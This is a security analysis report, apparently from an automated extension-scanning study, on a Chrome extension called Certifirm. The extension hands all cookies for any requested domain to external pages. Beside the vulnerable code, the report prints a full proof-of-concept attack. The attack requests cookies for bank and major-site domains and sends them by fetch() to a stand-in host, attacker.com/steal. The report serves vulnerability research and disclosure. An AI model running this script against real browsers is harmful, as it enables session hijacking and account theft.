# CoCo Analysis: hginmmeekeeahhjlaliapafjjmmmhcng

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (cookies_source → bg_external_port_postMessage_sink)

---

## Sink: cookies_source → bg_external_port_postMessage_sink

**CoCo Trace:**

CoCo detected multiple flows with cookies_source (lines 684-697) but these reference framework code. The actual vulnerability exists in the extension code after the 3rd "// original" marker at line 963.

The actual vulnerable flow in extension code (minified):
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hginmmeekeeahhjlaliapafjjmmmhcng/opgen_generated_files/bg.js
Line 965 (beautified):
chrome.runtime.onConnectExternal.addListener(function(port) {
  if (port.name === "certifirm") {
    port.onMessage.addListener(function(message) {
      chrome.storage.sync.get("certifirm", function(settings) {
        var enabled = settings && settings.certifirm && settings.certifirm.sincronizacionCookies;
        if (message.titulo === "SOLICITAR COOKIES" && enabled) {
          chrome.cookies.getAll({domain: message.dominio}, function(cookies) { // ← attacker controls domain
            port.postMessage({titulo: "cookies", cookies: cookies}); // ← all cookies for domain sent back
          });
        } else {
          port.postMessage({titulo: "cookies", cookies: null});
        }
      });
    });
  }
});
```

**Code:**

```javascript
// Background script (bg.js) - Minified code, beautified for clarity
chrome.runtime.onStartup.addListener(function() {
  chrome.storage.sync.get("certifirm", function(settings) {
    var syncEnabled = settings?.certifirm?.sincronizacionCookies;
    if (syncEnabled) {
      chrome.browserAction.setBadgeText({text: "ON"});
      chrome.browserAction.setBadgeBackgroundColor({color: "#007e33"});
    } else {
      chrome.browserAction.setBadgeText({text: "OFF"});
      chrome.browserAction.setBadgeBackgroundColor({color: "#cc0000"});
    }
  });
}));

// VULNERABLE: External port connection handler
chrome.runtime.onConnectExternal.addListener(function(port) {
  // Only accepts connections named "certifirm"
  if (port.name === "certifirm") {
    port.onMessage.addListener(function(message) {
      chrome.storage.sync.get("certifirm", function(settings) {
        // Check if cookie synchronization is enabled
        var syncEnabled = settings && settings.certifirm && settings.certifirm.sincronizacionCookies;

        // VULNERABILITY: If enabled, retrieve cookies for attacker-specified domain
        if (message.titulo === "SOLICITAR COOKIES" && syncEnabled) {
          chrome.cookies.getAll(
            {domain: message.dominio}, // ← ATTACKER CONTROLS THE DOMAIN
            function(cookies) {
              // Send ALL cookies for that domain back to external caller
              port.postMessage({
                titulo: "cookies",
                cookies: cookies // ← ALL cookies sent to attacker
              });
            }
          );
        } else {
          port.postMessage({titulo: "cookies", cookies: null});
        }
      });
    });
  }
});
```

**Manifest externally_connectable:**
```json
"externally_connectable": {
  "matches": [
    "*://certifirm.eu/*",
    "*://localhost/*"
  ]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External port connection via chrome.runtime.connect

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://certifirm.eu/ or http://localhost/)
// Or according to methodology: assume ANY attacker can trigger it

// Step 1: Connect to the extension
var port = chrome.runtime.connect(
  'hginmmeekeeahhjlaliapafjjmmmhcng', // extension ID
  {name: 'certifirm'}
);

// Step 2: Request cookies for any domain (e.g., steal banking cookies)
port.postMessage({
  titulo: 'SOLICITAR COOKIES',
  dominio: '.bankofamerica.com' // ← attacker specifies ANY domain
});

// Step 3: Receive stolen cookies
port.onMessage.addListener(function(response) {
  if (response.titulo === 'cookies' && response.cookies) {
    console.log('Stolen cookies from ' + '.bankofamerica.com:', response.cookies);

    // Exfiltrate all cookies to attacker's server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        domain: '.bankofamerica.com',
        cookies: response.cookies,
        victim: 'user_identifier'
      })
    });
  }
});

// Attack variations - steal cookies from multiple domains:
setTimeout(() => {
  port.postMessage({titulo: 'SOLICITAR COOKIES', dominio: '.google.com'});
}, 1000);

setTimeout(() => {
  port.postMessage({titulo: 'SOLICITAR COOKIES', dominio: '.facebook.com'});
}, 2000);

setTimeout(() => {
  port.postMessage({titulo: 'SOLICITAR COOKIES', dominio: '.amazon.com'});
}, 3000);
```

**Impact:** Critical information disclosure vulnerability. External websites matching the externally_connectable patterns (*.certifirm.eu/*, http://localhost/*) can establish a port connection to the extension and request cookies for ANY domain by specifying it in the message. The vulnerability allows:

1. **Universal Cookie Exfiltration**: The attacker can specify ANY domain (e.g., .google.com, .bankofamerica.com, .paypal.com) and receive ALL cookies for that domain. This is not limited to a specific website.

2. **Session Hijacking**: Stolen session cookies can be used to:
   - Hijack user accounts on any website
   - Access sensitive financial information
   - Perform unauthorized transactions
   - Steal personal data

3. **Conditional Exploitation**: The vulnerability only works if the user has enabled "sincronizacionCookies" (cookie synchronization) in the extension settings. However, this is likely the default or common configuration for users who install this extension.

4. **Attack Surface**: The inclusion of http://localhost/* in externally_connectable is particularly dangerous as:
   - Many development tools and local applications run on localhost
   - An attacker who can get code running on localhost (via malware, compromised dev tools, etc.) can exploit this
   - The certifirm.eu domain can also be exploited if compromised or via subdomain takeover

Even though manifest.json restricts externally_connectable to specific patterns, the methodology states we should treat this as exploitable if onConnectExternal exists. The ability to specify arbitrary domains makes this an exceptionally severe vulnerability allowing mass cookie theft across any website the user has visited.
